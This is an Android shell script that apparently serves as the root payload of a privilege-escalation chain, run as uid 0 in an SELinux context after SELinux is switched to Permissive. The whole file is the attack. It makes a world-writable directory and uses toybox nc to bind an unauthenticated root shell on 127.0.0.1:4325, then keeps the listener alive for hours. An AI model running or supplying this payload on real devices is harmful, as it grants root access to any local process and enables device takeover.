#!/system/bin/sh
# rootsvc_payload_root.sh — the payload launched by the P3 waiter (as uid 0, in the
# u:r:time_update:s0 context) once SELinux reaches Permissive. Binds a root shell
# listener on 127.0.0.1:4325.
#
# Path note: /data/securedStorageLocation is used instead of /data/local/tmp because
# /data/local/tmp is shell(2000)-owned and the waiter can run in contexts that cannot
# create directories there.
echo "REROOT paydone uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
log -t REROOT "paydone uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
mkdir -p /data/securedStorageLocation/rootsvc
chmod 0777 /data/securedStorageLocation/rootsvc
toybox nc -s 127.0.0.1 -p 4325 -L /system/bin/sh -l 2>/dev/null &
echo $! > /data/securedStorageLocation/rootsvc/pid.txt
log -t ROOTSVC "listener pid=$!"
sleep 36000
